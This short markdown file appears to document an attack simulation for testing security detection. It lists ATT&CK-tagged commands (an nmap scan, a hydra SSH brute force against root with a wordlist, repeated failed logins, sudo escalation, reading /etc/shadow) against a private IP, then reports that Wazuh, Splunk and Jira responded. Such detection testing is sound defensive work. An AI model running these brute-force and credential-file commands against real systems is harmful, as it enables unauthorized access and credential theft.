# Attack Simulation Commands

## Reconnaissance (T1046)
```bash
nmap -sV -p 22 10.128.124.88
```

## SSH Brute Force (T1110.001)
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt \
ssh://10.128.124.88 -t 4 -V -f
```

## Multiple Failed Logins (T1110)
```bash
for i in {1..10}; do ssh wronguser@10.128.124.88; done
```

## Privilege Escalation (T1548)
```bash
sudo su -
sudo cat /etc/shadow
```

## Sensitive File Access (T1003)
```bash
cat /etc/passwd
cat /etc/shadow
```

## Results
- 1,391 failed SSH attempts generated
- Wazuh detected within 30 seconds
- Splunk alert fired within 2 minutes
- Jira ticket auto-created in 45 seconds
